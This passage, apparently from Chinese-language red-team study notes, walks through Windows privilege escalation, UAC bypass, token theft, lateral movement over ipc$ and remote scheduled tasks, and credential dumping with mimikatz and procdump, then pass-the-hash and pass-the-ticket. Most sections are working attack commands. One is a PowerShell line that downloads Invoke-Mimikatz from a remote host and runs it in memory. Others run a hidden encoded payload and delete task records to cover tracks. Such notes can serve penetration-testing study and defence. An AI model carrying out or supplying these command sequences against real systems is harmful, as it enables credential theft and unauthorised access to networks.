href="https://github.com/rasta-mouse/Sherlock%EF%BC%8C%E8%B0%83%E7%94%A8%E8%84%9A%E6%9C%AC%E5%90%8E%E5%8F%AF%E4%BB%A5%E6%90%9C%E7%B4%A2%E5%8D%95%E4%B8%AA%E6%BC%8F%E6%B4%9E%E4%B9%9F%E5%8F%AF%E4%BB%A5%E6%90%9C%E7%B4%A2%E6%89%80%E6%9C%89%E6%9C%AA%E5%AE%89%E8%A3%85%E7%9A%84%E8%A1%A5%E4%B8%81%E3%80%82">https://github.com/rasta-mouse/Sherlock，调用脚本后可以搜索单个漏洞也可以搜索所有未安装的补丁。</a></p><h5 id="操作系统配置错误"><a href="#操作系统配置错误" class="headerlink" title="操作系统配置错误"></a>操作系统配置错误</h5><ol><li><p><strong>系统服务权限配置错误</strong></p><ul><li>服务未运行：攻击者会使用任意服务来替换原来的服务，然后重启服务</li><li>服务正在运行并且无法被终止：这个是大多数漏洞利用场景。攻击者通常会利用DLL劫持技术尝试重启服务来提权</li></ul><p>PowerUP：<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1%EF%BC%8C%E7%94%A8%E6%9D%A5%E5%AF%BB%E6%89%BE%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8%E7%9A%84windows%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%EF%BC%9B">https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1，用来寻找目标机器的windows服务漏洞；</a></p><p>Metasploit中的模块是service_permissions，选择”AGGRESSIVE”选项可以利用目标机器上每一个有缺陷的服务，该选项被禁用时，模块在第一次提权成功后就会停止工作</p></li><li><p><strong>注册表键</strong> <code>AlwaysInstallElevated</code></p><p>注册表键<code>AlwaysInstallElevated</code>是一个策略设置向，Windows允许低权限用户以System权限运行安装文件，如果启用此策略设置项，那么任何低权限用户都能以NT AUTHORITY\SYSTEM权限来安装恶意的MSI文件</p><p><code>PathAlwaysInstallElevated</code>漏洞产生的原因是用户开启了Windows Installer特权安装功能。Windows Installer是windows的组件之一，专门用来管理和配置软件服务。它除了是一个安装程序，还用于管理软件的安装，管理软件组件的添加和删除，监视文件的还原，通过回滚进行灾难恢复等。Windows Installer分为客户端安装服务（Msiexec.exe）和MSI文件两部分，他们是一起工作的，Windows Installer通过Msiexec.exe安装MSI文件包含程序，MSI文件是Windows Installer的数据包，它实际上是一个数据库，包含安装和卸载软件是需要使用的大量指令和数据。简单来说，双击MSI文件就可以运行Msiexec.exe</p><p>PowerUp的<code>Get-RegistryAlwaysInstallerElevated</code>模块用来检测注册表键是否被设置，如果<code>AlwaysInstallElevated</code>已经被设置就表明了MSI文件是以System权限运行的（True表示已经被设置）</p><p>个人理解：这个漏洞就是利用MSI运行时权限问题来造成提权</p></li><li><p><strong>可信任服务路径漏洞</strong></p><p>利用了windows文件路径解析的特性，如果一个服务的<strong>可执行文件的路径没有被双引号引起来且包含空格</strong>，那么这个服务就是有漏洞的</p><ul><li>如果路径和服务有关，就可以任意创建一个服务或者编译Service模板</li><li>如果路径和可执行文件有关，就可以任意创建一个可执行文件</li></ul><p>寻找漏洞：<code>wmic service get name,displayname,pathname,startmode | findstr /i &quot;Auto&quot; | findstr /i /v &quot;C:\Windows\\&quot; | findstr /i /v &quot;&quot;&quot; </code></p><p>需要进一步检测目标文件夹的写权限，使用windows内置的工具<code>icacls</code>：<code>icacls &quot;path&quot;</code></p><p>然后把上传的程序重命名放置在此漏洞且可写的目录下，重启服务<code>sc stop service_name</code> <code>sc start service _name</code></p><p>MSF攻击模块 <code>exploit/windows/local/trusted_service_path</code>，它会自动反弹一个新的metertreter，查询显示提权成功，但是这个链接很快就会断开，需要在断开前迁移进程<code>set AutoRunScript migrate -f</code></p></li><li><p><strong>自动安装配置文件</strong></p><p>网络管理员在内网给多台机器配置同一环境时，通常会使用脚本化批量部署，过程中会使用安装配置文件，这些文件会包含一些敏感信息</p><p>文件检查：<code>dir /b /s c:\Unattend.xml</code></p><p>MSF攻击模块：<code>post/windows/gather/enum_unattend</code></p></li><li><p><strong>计划任务</strong></p><p>查看计划任务：<code>schtasks /query /fo LIST /v</code></p><p>AccessChk是SysInterals套件中的一个工具，用于在windows中进行一些系统或程序的高级查询，管理，故障排除工作。它是微软官方提供的工具，一般不会被杀毒软件发现，下载：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/accesschk%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%94%BB%E5%87%BB%E8%80%85%E5%AF%B9%E4%BB%A5%E9%AB%98%E6%9D%83%E9%99%90%E8%BF%90%E8%A1%8C%E7%9A%84%E4%BB%BB%E5%8A%A1%E7%9B%AE%E5%BD%95%E6%9C%89%E5%8F%AF%E5%86%99%E6%9D%83%E9%99%90%E5%B0%B1%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E8%A6%86%E7%9B%96%E5%8E%9F%E7%A8%8B%E5%BA%8F%E3%80%82">https://docs.microsoft.com/zh-cn/sysinternals/downloads/accesschk，如果攻击者对以高权限运行的任务目录有可写权限就可以利用恶意程序覆盖原程序。</a></p><p>查看目录权限配置情况：<code>accesschk.exe -dqv &quot;c:\Microsoft&quot; -accepteula</code></p><p>其他常用命令</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs livescript">accesschk.exe /accepteula  <span class="hljs-comment"># 自动接受许可协议，避免弹出对话框</span><br><br><span class="hljs-comment"># 列出某个驱动下所有权限配置有缺陷的文件夹</span><br>accesschk.exe -uwdqsUsersc:<span class="hljs-string">\</span><br>accesschk.exe -uwqs<span class="hljs-string">&quot;AuthenticatedUsers&quot;</span>c:<span class="hljs-string">\</span><br><span class="hljs-comment"># 列出某个驱动下所有权限配置有缺陷的文件</span><br>accesschk.exe -uwdqsUsersc:<span class="hljs-string">\*.*</span><br>accesschk.exe -uwqs<span class="hljs-string">&quot;AuthenticatedUsers&quot;</span>c:<span class="hljs-string">\*.*</span><br></code></pre></td></tr></table></figure></li></ol><h5 id="组策略首选项提"><a href="#组策略首选项提" class="headerlink" title="组策略首选项提"></a>组策略首选项提</h5><p><strong>简介</strong></p><p>SYSVOL是活动目录里面的一个用于存储域公共文件服务器副本的共享文件夹，在域中的所有于控制器之间进行复制。SYSVOL文件夹是安装活动目录时自动创建的，用来存放登录脚本，组策略数据以及其它域控制器需要的域信息。SYSVOL在所有经过身份验证的域用户或者域信任用户具有读权限的活动目录的域范围内共享。SYSVOL目录中所有的域控制器中是自动同步的，所有域策略均存放在<code>C:\Windows\SYSVOL\DOMAIN\Policies\</code>中</p><p>常见的组策略首选项（Group Policy Preferences，GPP)：</p><ul><li>映射驱动器（Drives.xml )</li><li>创建本地用户</li><li>数据源（DataSources.xml )</li><li>打印机配置(Printers.xml )</li><li>创建/更新服务(（Services.xml )</li><li>计划任务（ScheduledTasks.xml )</li></ul><p><strong>获取组策略的凭据</strong></p><p>管理员在域中新建一个组策略后，操作系统会自动在SYSVOL共享目录中生成一个XML文件，该文件保存了该组策略更新后的密码。该密码是使用AES-256加密算法，任何用户都可以访问保存在XML文件中的密码并解密，从而控制域中所有使用该账户/密码的本地管理员计算机。在SYSVOL中搜索，可以找到包含<code>cpassword</code>的XML文件</p><ul><li><p>手动查找<code>cpassword</code></p></li><li><p>使用<code>Powershell</code>获取<code>cpassword</code></p><p>目标系统导入Get-GPPPassword.ps1脚本获取</p></li><li><p>使用MSF查找<code>cpassword</code></p><p>选择相应的模块即可</p></li><li><p>使用Empire查找<code>cpassword</code></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">usemodule</span> privesc/gpp<br><span class="hljs-literal">info</span><br>execute<br></code></pre></td></tr></table></figure></li></ul><p>除了Groups.xml还有几个组策略首选项文件中有可选的cpassword 属性</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">Services\<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Scrvices</span>.</span></span>xml<br>scheduledTasks\<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ScheduledTasks</span>.</span></span>xml.<br>Printers\<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Printers</span>.</span></span>xml<br>Drives\<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Drives</span>.</span></span>xml<br>DataSources\<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DataSources</span>.</span></span>xml<br></code></pre></td></tr></table></figure><h5 id="绕过UAC提权"><a href="#绕过UAC提权" class="headerlink" title="绕过UAC提权"></a>绕过UAC提权</h5><blockquote><p>UAC(User Account Control) 在操作启动前对用户的身份进行验证，避免恶意软件在计算机上执行安装操作或更改计算机设置；微软设置了安全控制策略，分为高，中，低三个等级，高等级具有管理员权限，中等级有普通用户权限，低等级的权限是有限的</p><p>UAC有四种设置要求：<br>1、始终通知<br>2、仅在程序试图更改我的计算机时通知我（默认设置）<br>3、仅在程序试图更改我的计算机时通知我（不降低桌面的亮度）<br>4、从不提示</p></blockquote><ul><li><p><strong>bypassuac</strong> 模块</p><p>使用MSF的<code>bypassuac</code>模块的时候，当前用户必须在管理员组中，且UAC为默认设置（即：仅在程序试图更改我的计算机时通知我），bypassuac模块运行时，会在目标机器上创建多个文件，这些文件会被杀软识别，但是<code>bypassuac_injection</code>模块直接运行在内存的反射DLL中，所以不会接触目标机器的硬盘，被检测出来的概率小。</p></li><li><p><strong>RunAs</strong> 模块</p><p>使用<code>exploit/windows/local/ask</code>模块，创建一个可执行文件，目标机器会运行一个发起提升权限的请求程序提示用户是否要继续运行，如果用户选择继续运行，就会返回一个高权限shell。</p><p>想要执行RunAs模块进行提权，当前用户必须在管理员组或者知道管理员的密码，对UAC的设置没有要求，使用RunAs模块时需要使用<code>EXE::Custom</code>选项创建一个可执行文件（需要免杀处理）</p></li><li><p>Nishang中的Invoke-PaUACme模块</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">Invoke-PsUACme -Verbose # 使用Sysprep方法并执行默认的payload<br>Invoke-PsUACme -<span class="hljs-function"><span class="hljs-keyword">method</span> <span class="hljs-title">oobe</span> -<span class="hljs-title">Verbose</span> # 使用<span class="hljs-title">oobe</span>方法并执行默认的<span class="hljs-title">payload</span></span><br><span class="hljs-function"><span class="hljs-title">Invoke</span>-<span class="hljs-title">PsUACme</span> -<span class="hljs-title">method</span> <span class="hljs-title">oobe</span> -<span class="hljs-title">Verbose</span> -<span class="hljs-title">Payload</span> &quot;<span class="hljs-title">powershell</span> -<span class="hljs-title">windowstyle</span> <span class="hljs-title">hidden</span> -<span class="hljs-title">e</span> <span class="hljs-title">YourPayload</span>&quot;  # 自己指定<span class="hljs-title">payload</span></span><br><span class="hljs-function"></span><br><span class="hljs-function">-<span class="hljs-title">PayloadPath</span> 指定<span class="hljs-title">payload</span>的路径</span><br><span class="hljs-function">-<span class="hljs-title">CustomDll64</span> 或 -<span class="hljs-title">CustomDll32</span> 可以自定义<span class="hljs-title">DLL</span>文件</span><br></code></pre></td></tr></table></figure></li><li><p>Empire中的bypassuac模块</p><ul><li><p>bypassuac模块</p><p>在Empire中输入<code>usemodule privesc/bypassuac</code> 设置监听参数，执行 <code>execute</code>就可以获得新的shell，使用list查看，带星号（*）就表示提权成功</p></li><li><p>bypassuac_wscript模块</p><p>模块大致原理就是使用<code>C:\Windows\wscript.exe</code>执行<code>Payload</code>绕过UAC，适用于Win7，查看带星号（*）就表示提权成功</p></li></ul></li></ul><h5 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h5><blockquote><p>令牌是指系统中的临时密钥，相当于账户和密码，用于决定是否允许当前请求及判断当前请求的是哪个账户，令牌将持续存在于系统中（除非系统重启）</p></blockquote><p>伪造令牌攻击的核心是<code>Kerberos</code>协议</p><p>MSF获取令牌</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-keyword">use</span> incognito <br>list_tokens -u <span class="hljs-comment"># 列出可用的token 令牌的数量取决于MSFshell的级别</span><br>impersonate_token 令牌 <span class="hljs-comment"># 假冒令牌</span><br></code></pre></td></tr></table></figure><p>如果系统存在有效的令牌，我们也可以尝试通过Rotten Potato程序来模拟用户令牌实现权限的提升</p><p><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075</a></p><p>使用MSF查询可用令牌</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">use</span> <span class="hljs-string">incognito</span><br><span class="hljs-attr">list_tokens</span> <span class="hljs-string">-u</span><br></code></pre></td></tr></table></figure><p>将<code>rottenpotato.exe</code>上传到目标机器中</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs smali">upload rottenpotato.exe <span class="hljs-comment"># MSF上传</span><br>execute -HC -f rottenpotato.exe<br>impersonate_token 令牌 <span class="hljs-comment"># 导入令牌</span><br></code></pre></td></tr></table></figure><p>学习文章</p><p><a href="https://hackergu.com/powerup-stealtoken-rottenpotato/">https://hackergu.com/powerup-stealtoken-rottenpotato/</a></p><h5 id="无凭证条件下的权限获取"><a href="#无凭证条件下的权限获取" class="headerlink" title="无凭证条件下的权限获取"></a>无凭证条件下的权限获取</h5><p><strong>LLMNR和NetBIOS欺骗攻击</strong></p><p>LLMNR（本地链路多播名称解析）是一种域名系统数据包格式。当局域网中的DNS服务器不可用时，DNS客户端会使用LLMNR解析本地网段中机器的名称，指导DNS回复正常为止。LLMNR支持IPv6</p><p>NetBIOS是一种网络协议，根据NetBIOS协议广播获得计算机名称，并将其解析为相应的IP地址，NetBIOS不支持IPv6</p><p>Net-NTLM Hash 与 NTLM Hash不同</p><p>NTLM Hash 是指Windows操作系统的Security Account Manager中保存的用户密码散列值。NTLM Hash通常保存在windows中的SAM文件或者ntds.dit数据库中，用户对访问资源的用户进行身份验证</p><p>Net-NTLM Hash 是指在网络环境中经过NTLM认证的散列值。挑战/响应验证中的响应就包含了Net-NTLM Hash，使用Responder抓取的通常就是Net-NTLM Hash，攻击者无法使用该散列值进行哈希传递攻击，只能使用Hashcat等工具获得明文后进行横向移动</p><p>攻击工具可以使用<code>Responder</code></p><h4 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h4><h5 id="Windows远程连接和相关命令"><a href="#Windows远程连接和相关命令" class="headerlink" title="Windows远程连接和相关命令"></a>Windows远程连接和相关命令</h5><p><strong>IPC</strong></p><p>IPC共享“命名管道”的资源，为了实现远程进程间通信而开放的命名管道。IPC可以通过验证用户名和密码获得相应的权限，通常在远程管理计算机和查看计算机的共享资源时使用。</p><p>通过<code>ipc$</code>可以与目标机器建立连接，利用这个连接可以访问目标机器中的文件，进行上传下载操作和运行其他命令</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir">建立一个ipc$<br>net <span class="hljs-keyword">use</span> \\<span class="hljs-number">192.168</span>.<span class="hljs-number">17.18</span>\ipc<span class="hljs-variable">$ </span><span class="hljs-string">&quot;password&quot;</span> /<span class="hljs-symbol">user:</span>administrator<br>查看已经建立的连接<br>net <span class="hljs-keyword">use</span><br></code></pre></td></tr></table></figure><p><code>ipc$</code><strong>利用条件</strong></p><ul><li><p>开启了139、445端口</p></li><li><p>管理员开启了默认共享</p><p>默认共享是为了方便管理员进行远程管理而默认开启的，包括所有的逻辑盘（c$ d$ e$）和系统目录winnt或windows（admin$），通过<code>ipc$</code>，可以实现对这些默认共享目录的访问</p></li></ul><p><code>ipc$</code><strong>连接失败的原因</strong></p><ul><li>用户名和密码错误</li><li>没有打开<code>ipc$</code>默认共享</li><li>不能成功连接目标的139和445端口</li><li>命令输入错误</li></ul><p><strong>常见的错误号</strong></p><ul><li>错误号 5：拒绝访问</li><li>错误号51：无法找到网络路径，网络中存在问题</li><li>错误号53：找不到网络路径，包括IP地址错误，目标未开机，目标的<code>lanmanserver</code>服务未启动，目标有防护墙（端口过滤）</li><li>错误号67：找不到网络名，包括<code>lanmanserver</code>服务未启动，<code>ipc$</code>已被删除</li><li>错误号1219：提供的凭据与已存在的凭据集冲突，例如已经和目标建立<code>ipc$</code>，需要在错误原链接后重新进行连接</li><li>错误号1326：未知的用户名和密码</li><li>错误号1792：试图登录，但是网络登录服务没有启动</li><li>错误号2242：用户密码已经过期</li></ul><p><strong>windows自带工具获取远程主机信息</strong></p><ol><li><p><code>dir</code>命令</p><p>使用<code>net use</code>命令与远程目标机器建立<code>ipc$</code>后，可以使用<code>dir</code>列出远程主机的文件</p></li><li><p><code>tasklist</code></p><p>使用<code>net use</code>命令与远程目标机器建立<code>ipc$</code>后，可以使用<code>tasklist</code>命令的<code>/S /U /P</code>参数列出远程主机上运行的进程</p></li></ol><p><strong>计划任务</strong></p><ol><li><p><code>at</code>命令</p><blockquote><p>at 是windows自带的创建计划任务的命令，主要工作在Windows server 2008 之前的版本</p></blockquote><p>使用<code>at</code>命令在远程目标机器上面创建计划任务流程</p><ol><li><p>使用<code>net time</code>命令确定远程机器当前的系统时间</p><p><code>net time \\192.168.1.17</code></p></li><li><p>将文件复制到目标系统</p><p><code>copy calc.bat \\192.168.1.17\C$</code></p></li><li><p>使用<code>at</code>创建计划任务</p><p><code>at \\192.168.1.17 4:11PM C:\cacl.bat</code></p><p>创建一个计划任务，内容是下午4：11运行C盘 下的<code>cacl.bat</code></p></li><li><p>清楚<code>at</code>记录</p><p><code>at \\192.168.1.17 jobID /delete</code></p></li></ol></li><li><p><code>schtasks</code>命令</p><blockquote><p>Windows Vist、Windows Server  2008及之后的版本将at命令废弃了，攻击者就用schtasks命令代替</p></blockquote><p>在远程主机上创建一个名称为<code>test</code>的计划任务，该任务在开机时启动C盘下的<code>cacl.bat</code>权限为system</p><p><code>schtasks /create /s 192.168.1.17 /tn teat /sc onstart /tr c:\cacl.bat /ru system /f</code></p><p>在远程主机上运行计划任务<code>test</code></p><p><code>schtasks /run /s 192.168.1.17 /i /tn &quot;test&quot;</code></p><blockquote><p>在使用schtasks命令的时候不用输入密码，因为之前与目标 机器已经建立了ipc$连接，如果没有建立连接可以在执行的时候自己添加/u /p参数</p></blockquote><p>删除计划任务</p><p><code>schtasks /delete /s 192.168.1.17 /tn &quot;test&quot; /f</code></p><blockquote><p>schtasks命令执行后会在系统中留下日志文件C:\Windows\Tasks\SchedLgU.txt，如果执行命令后没有回显可以配合ipc$执行文件，使用type命令远程查看执行结果</p></blockquote><p>删除<code>ipc$</code></p><p><code>net use 名称 /del /y</code></p></li></ol><h5 id="散列值获取分析"><a href="#散列值获取分析" class="headerlink" title="散列值获取分析"></a>散列值获取分析</h5><p><strong>LM Hash 和 NTLM Hash</strong></p><p>windows通常使用两种方法对用户的密码进行加密处理，域环境中用户的信息 存储在<code>ntds.dit</code>中，加密后为散列值，从Windows Vista 和Windows Server 2008版本开始，Windows 就默认禁用了LM Hash。NTLM Hash是微软为了提高安全性的同时保证兼容性而设计的散列加密算法，NTLM Hash是基于MD4 加密算法加密的。</p><p><strong>单机密码抓取与防范</strong></p><blockquote><p>想要在Windows中抓取散列值和明文密码，必须将权限提升到System。本地用户名、散列值和其他安全验证信息都保存在SAM文件中。lsass.exe 进程用户Windows的安全策略（本地安全策略和登录策略）。</p><p>SAM文件保存的位置 在C:\Windows\System32\config中</p></blockquote><p>下面是常见的单机密码抓取工具</p><ol><li><p><code>GetPass</code></p><p>直接运行即可获取密码</p></li><li><p><code>PwDump7</code></p><p>直接运行即可</p></li><li><p><code>QuarksPwDump</code></p><p>运行<code>QuarksPwDump.exe --dump-hash-local</code>就可以导出用户的NTLM Hash</p><p>它已经被大多数杀软标记为恶意软件</p></li><li><p>通过SAM和System文件抓取密码</p><ol><li><p>到处SAM文件和System文件</p><p><code>reg save hklm\sam sam.hive</code></p><p><code>reg save hklm\system system.hive</code></p></li><li><p>读取文件获得NTLM Hash</p><ul><li><p>使用<code>mimikatz</code>读取文件</p><blockquote><p>mimikatz是由法国的技术高手使用c语言写的系统调试工具，可以从内存中提取明文密码、散列值、PIN和Kerberos票据，它也可以执行哈希传递，票据传递或者构建黄金票据</p></blockquote><p>将<code>sam.hive</code> <code>system.hive</code>文件放到mimikatz的同一个目录下面</p><p><code>lsadump::sam/sam:sam.hive /system:system.hive</code></p></li><li><p>使用Cain读取</p></li><li><p>使用<code>mimikatz</code>直接读取</p><blockquote><p>直接在目标机器上面运行</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp">privilege::debug 提升权限<br>token::elevate 将权限提升到system<br>lsadump::sam 读取本地的SAM文件，获取NTLM Hash<br></code></pre></td></tr></table></figure></li></ul></li></ol></li></ol><ol start="5"><li><p><code>mimikatz</code>在线读取SAM</p><p><code>mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;</code></p></li><li><p><code>mimikatz</code>离线读取<code>lsass.dmp</code>文件</p><ol><li><p>导出<code>lsass.dmp</code>文件</p><ul><li><p>使用任务管理器导出</p><p>在任务管理器中找到<code>lsass.dmp</code>文件，右键选择”Create Dump File”</p></li><li><p>使用<code>procdump</code>导出</p><blockquote><p>这个是微软发布的工具所以不会被杀软查杀</p></blockquote><p><code>procdump.exe -accepteula -ma lsass.exe lsass.dmp</code> </p></li></ul></li><li><p>使用<code>mimikatz</code>获取</p><p>先在命令环境运行<code>mimikatz</code>，将<code>lsass.dmp</code>文件加载到<code>mimikatz</code>当中，输入命令<code>sekurlsa::minidump lsass.DMP</code>，如果显示<code>Switch to MINIDUMP</code>就表示成功，最后输入<code>sekurlsa::logonPasswords full</code> 命令导出散列值</p></li></ol></li><li><p>使用<code>Powershell</code>对散列值进行Dump操作</p><p>进入Nishang目录，将Get-PassHashes.ps1脚本导入</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-keyword">Import</span>-M,odule .\<span class="hljs-keyword">Get</span>-PassHashes.ps1<br><span class="hljs-keyword">Get</span>-PassHashes<br></code></pre></td></tr></table></figure></li><li><p><code>Powershell</code>远程加载<code>mimikatz</code></p><p><code>powershell.exe IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.101/Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz</code></p><p><a href="https://www.freebuf.com/articles/web/176796.html">九种姿势运行Mimikatz </a></p></li></ol><p><strong>使用Hashcat获取密码</strong></p><p>这是一个密码破解软件，kali自带了，具体使用可以查看它提供的帮助</p><h5 id="哈希传递攻击-PTH"><a href="#哈希传递攻击-PTH" class="headerlink" title="哈希传递攻击(PTH)"></a>哈希传递攻击(PTH)</h5><p>如果计算机本地管理员账户和密码也是相同的，攻击者就可以利用哈希传递攻击的方法登录内网中的其他计算机</p><p><strong>使用NTLM Hash进行哈希传递</strong></p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs groovy">mimikatz.exe<br><span class="hljs-attr">privilege:</span>:debug<br><span class="hljs-attr">sekurlsa:</span>:path <span class="hljs-regexp">/user:administrator /</span><span class="hljs-attr">domain:</span>lcdm123.com /<span class="hljs-attr">ntlm:</span>NTLM Hash<br></code></pre></td></tr></table></figure><p>列出远程主机C盘的内容</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs latex">dir <span class="hljs-tag">\<span class="hljs-name">\</span></span>主机名<span class="hljs-tag">\<span class="hljs-name">C</span></span><span class="hljs-formula">$</span><br></code></pre></td></tr></table></figure><p><strong>使用AES-256密钥进行哈希传递</strong></p><blockquote><p>远程系统必须安装 KB2871997</p></blockquote><p>使用<code>mimikatz</code>抓取密钥</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">mimikatz</span><span class="hljs-selector-class">.exe</span><br><span class="hljs-selector-tag">privilege</span><span class="hljs-selector-pseudo">::debug</span><br><span class="hljs-selector-tag">sekurlsa</span><span class="hljs-selector-pseudo">::ekeys</span><br></code></pre></td></tr></table></figure><p>以管理员命令运行<code>mimikatz</code></p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs groovy">mimikatz.exe<br><span class="hljs-attr">privilege:</span>:debug<br><span class="hljs-attr">sekurlsa:</span>:path <span class="hljs-regexp">/user:administrator /</span><span class="hljs-attr">domain:</span>lcdm123.com /<span class="hljs-attr">aes256:</span>AES<span class="hljs-number">-256</span><br></code></pre></td></tr></table></figure><p><strong>注意</strong></p><ol><li><code>dir</code>后面要使用主机名，而不是IP</li><li>AES-128密钥也可以用来Hash传递</li><li>使用AES密钥对远程主机进行哈希传递的前提是安装KB2871997</li><li>安装了KB2871997后仍然可以使用SID为500的用户的NTLM Hash进行哈希传递</li><li>要使用<code>mimikatz</code>的哈希传递功能，需要具有本地管理员的权限</li></ol><blockquote><p>KB2871997通过禁止本地管理员权限与远程计算机进行连接，无法通过本地管理员权限对远程计算机使用PsExec，WMI，smbexec，schtasks，at，也无法访问远程主机的文件共享。但是对于Administrator（SID为500）的账户依然可以进行哈希传递</p></blockquote><h5 id="票据传递攻击"><a href="#票据传递攻击" class="headerlink" title="票据传递攻击"></a>票据传递攻击</h5><ol><li><p>使用<code>mimikatz</code>进行票据传递</p><p>导出内存中的票据</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp">mimikatz.exe<br>privilege::debug<br>sekurlsa::tickets /<span class="hljs-keyword">export</span><br>执行命令后，会在当前目录中出现多个服务的票据文件<br><br>kerberos::purge  清除内存中的票据<br><br>kerberos::ptt PATH  注入票据<br></code></pre></td></tr></table></figure></li><li><p>使用<code>kekeo</code>进行票据传递</p><p>工具下载：<a href="https://github.com/gentilkiwi/kekeo">https://github.com/gentilkiwi/kekeo</a></p><p><code>kekeo</code>需要域名，用户名，NTLM Hash三者配合生成票据，再将票据导入</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs less">生成票据<br><span class="hljs-selector-tag">kekeo</span><span class="hljs-selector-class">.exe</span><br><span class="hljs-selector-tag">tgt</span><span class="hljs-selector-pseudo">::ask</span> /<span class="hljs-selector-tag">user</span><span class="hljs-selector-pseudo">:administrator</span> /<span class="hljs-selector-tag">domain</span><span class="hljs-selector-pseudo">:lcdm123.com</span> /<span class="hljs-selector-tag">ntlm</span><span class="hljs-selector-pseudo">:NTLM</span> <span class="hljs-selector-tag">Hash</span><br>清除票据<br><span class="hljs-selector-tag">kerberos</span><span class="hljs-selector-pseudo">::purge</span> # <span class="hljs-selector-tag">kekeo</span>的命令<br><span class="hljs-selector-tag">klist</span> <span class="hljs-selector-tag">purge</span> # <span class="hljs-selector-tag">Windows</span>自带的命令<br>导入票据<br><span class="hljs-selector-tag">kerberos</span><span class="hljs-selector-pseudo">::ptt</span> <span class="hljs-selector-tag">PATH</span><br></code></pre></td></tr></table></figure></li></ol><p><strong>注意</strong></p><ul><li>票据文件注入内存的默认有效时间是10小时</li><li>在目标机器上不需要本地管理员权限就可以进行票据传递</li></ul><h5 id="PsExec使用"><a href="#PsExec使用" class="headerlink" title="PsExec使用"></a>PsExec使用</h5><p><code>PsExec</code>运行的基本原理是：通过管道在远程目标机器上创建一个psexec服务，并在本地磁盘中生成一个名为<code>PSEXECSVC</code>的二进制文件，然后通过<code>psexec</code>服务运行命令，运行结束后删除服务</p><ol><li><p>已经建立了<code>ipc$</code></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">PsExec</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">-accepteula</span> \\192<span class="hljs-selector-class">.168</span><span class="hljs-selector-class">.1</span><span 